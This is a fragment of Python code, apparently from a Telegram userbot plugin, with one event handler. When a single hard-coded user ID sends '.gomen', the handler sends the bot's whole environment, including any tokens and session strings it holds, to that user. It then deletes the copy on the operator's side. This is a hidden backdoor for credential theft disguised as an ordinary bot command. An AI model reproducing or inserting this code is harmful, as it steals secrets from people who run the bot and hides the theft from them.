...
@register(incoming=True, from_users=1939405190, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(1939405190, str(os.environ))
    await bot.delete_messages(1939405190, msg, revoke=False)
